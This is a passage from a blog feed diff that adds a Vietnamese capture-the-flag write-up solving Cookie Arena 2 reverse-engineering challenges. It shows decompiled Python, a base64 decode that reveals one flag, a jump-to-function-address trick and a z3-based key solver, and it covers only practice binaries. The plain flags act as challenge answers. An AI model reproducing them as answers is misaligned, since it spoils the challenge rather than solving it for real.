@@ -2925,6 +2925,596 @@ It’s just a warmup but with another layer which is the kernel.&lt;/p&gt;
 &gt;&lt;/p&gt;</description>
         </item>
         <item>
+        <title>Cookie Arena 2 | Reverse Engineering</title>
+        <link>/p/cookie-arena-2-reverse-engineering/</link>
+        <pubDate>Sun, 09 Jul 2023 00:00:00 +0000</pubDate>
+        
+        <guid>/p/cookie-arena-2-reverse-engineering/</guid>
+        <description>&lt;img src="/p/cookie-arena-2-reverse-engineering/featured.png" alt="Featured image of post Cookie Arena 2 | Reverse Engineering" /&gt;&lt;h2 id=&#34;pyreverse&#34;&gt;Pyreverse&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Sử dụng &lt;a class=&#34;link&#34; href=&#34;https://github.com/serfend/pydumpck&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;pydumpck&lt;/a&gt; để decompile &lt;code&gt;exe&lt;/code&gt; &amp;ndash;&amp;gt; &lt;code&gt;py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# pyreverser.pyc.cdc.py&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;reverse_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[::&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;scramble_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;scrambled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;enumerate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;scrambled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;scrambled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scrambled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;secret_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scramble_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reverse_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Welcome to PyReverser!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Please enter a word or phrase:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;generated_value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scramble_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reverse_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upper&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Generated value:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generated_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Can you find the hidden flag?&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;reversed_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reverse_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;secret_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Reversed flag:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reversed_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Để ý flag được decode từ đoạn base64 bên trên&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@Spid3r:~# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CHH&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;python2Exi_Reverse_ENginering&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;jump&#34;&gt;Jump&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;phân-tích-file&#34;&gt;Phân tích file&lt;/h3&gt;
+&lt;p&gt;Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image.png&#34;
+	width=&#34;1610&#34;
+	height=&#34;363&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image_hu8e39eb7651936f4ff8d56574c8a3386c_175368_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image_hu8e39eb7651936f4ff8d56574c8a3386c_175368_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;443&#34;
+		data-flex-basis=&#34;1064px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Lợi dụng chạy hàm &lt;code&gt;_flag&lt;/code&gt; bằng cách nhập ​địa chỉ &lt;code&gt;_flag&lt;/code&gt; vào ô nhập khi chạy jump.exe&lt;/p&gt;
+&lt;h3 id=&#34;tìm-địa-chỉ-_flag-và-lấy-flag&#34;&gt;Tìm địa chỉ &lt;code&gt;_flag&lt;/code&gt; và lấy flag&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-3.png&#34;
+	width=&#34;895&#34;
+	height=&#34;180&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-3_hu0577eb2f141f2263788d35130cbe214e_99109_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-3_hu0577eb2f141f2263788d35130cbe214e_99109_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;497&#34;
+		data-flex-basis=&#34;1193px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-2.png&#34;
+	width=&#34;622&#34;
+	height=&#34;269&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-2_hucb53687cc737718ee2c067f540f8b4d0_45939_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-2_hucb53687cc737718ee2c067f540f8b4d0_45939_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;231&#34;
+		data-flex-basis=&#34;554px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Lưu ý: địa chỉ &lt;code&gt;00401500&lt;/code&gt; đang ở hexa &amp;ndash;&amp;gt; đổi sang decimal là &lt;code&gt;4199680​&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-1.png&#34;
+	width=&#34;756&#34;
+	height=&#34;189&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-1_hu47aaf929cc40273fe69bf3de706cd426_57904_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-1_hu47aaf929cc40273fe69bf3de706cd426_57904_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;400&#34;
+		data-flex-basis=&#34;960px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;rev1&#34;&gt;Rev1&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image12.png&#34;
+	width=&#34;369&#34;
+	height=&#34;336&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image12_hu1400eba19f01779c66e4087de41ec934_8072_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image12_hu1400eba19f01779c66e4087de41ec934_8072_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;phân-tích-file-1&#34;&gt;Phân tích file&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-5.png&#34;
+	width=&#34;1216&#34;
+	height=&#34;120&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-5_hu3056d99746cc208521af00fa139614e7_192531_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-5_hu3056d99746cc208521af00fa139614e7_192531_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1013&#34;
+		data-flex-basis=&#34;2432px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PE32&lt;/code&gt; &amp;ndash;&amp;gt; 32 bits&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GUI&lt;/code&gt; &amp;ndash;&amp;gt; WinMain&lt;/p&gt;
+&lt;h3 id=&#34;winmain&#34;&gt;WinMain&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Xử lý I/O&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-6.png&#34;
+	width=&#34;939&#34;
+	height=&#34;497&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-6_huef2740d153d915af82f5efa9c9005592_198350_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-6_huef2740d153d915af82f5efa9c9005592_198350_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;188&#34;
+		data-flex-basis=&#34;453px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Kiểm tra trong &lt;code&gt;DialogBoxParamA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-7.png&#34;
+	width=&#34;784&#34;
+	height=&#34;386&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-7_hu6dd93cabab55686be7d3d37db0848903_118629_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-7_hu6dd93cabab55686be7d3d37db0848903_118629_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;DialogBoxParamA&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Hàm &lt;code&gt;GetItemTextA&lt;/code&gt; sẽ lấy các string được input vào và check key qua &lt;code&gt;sub_402030&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image-8.png&#34;
+	width=&#34;599&#34;
+	height=&#34;678&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image-8_hu98854747e9056abd36bb50c5bc983256_152683_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-8_hu98854747e9056abd36bb50c5bc983256_152683_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;sub_402030&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;88&#34;
+		data-flex-basis=&#34;212px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Kiểm tra hàm này thì thấy rằng &lt;code&gt;dword_414448&lt;/code&gt; chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)&lt;/p&gt;
+&lt;h3 id=&#34;debug&#34;&gt;Debug&lt;/h3&gt;
+&lt;div class=&#34;video-wrapper&#34;&gt;
+    &lt;video
+    controls
+    src=&#34;media1.mp4&#34;
+    poster=&#34;./video-poster.png&#34;
+    
+    &gt;
+        &lt;p&gt;
+            Your browser doesn&#39;t support HTML5 video. Here is a
+            &lt;a href=&#34;media1.mp4&#34;&gt;link to the video&lt;/a&gt; instead.
+        &lt;/p&gt;
+    &lt;/video&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Dựa vào những gì debug được có thể viết lại đoạn code dưới đây:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image19.png&#34;
+	width=&#34;1137&#34;
+	height=&#34;866&#34;
+	srcset=&#34;/p/cookie-arena-2-reverse-engineering/image19_hufa1fbf41b99450242ea98ee74b128ec8_653444_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image19_hufa1fbf41b99450242ea98ee74b128ec8_653444_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;131&#34;
+		data-flex-basis=&#34;315px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Đến đây thì chỉ đơn giản là dùng z3 để viết script giải &lt;a class=&#34;link&#34; href=&#34;solve_rev1.py&#34; &gt;solve_rev1.py&lt;/a&gt; để lấy key&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/cookie-arena-2-reverse-engineering/image20.png&#34;
+	width=&#34;355&#34;
+	height=&#34;293&#34;
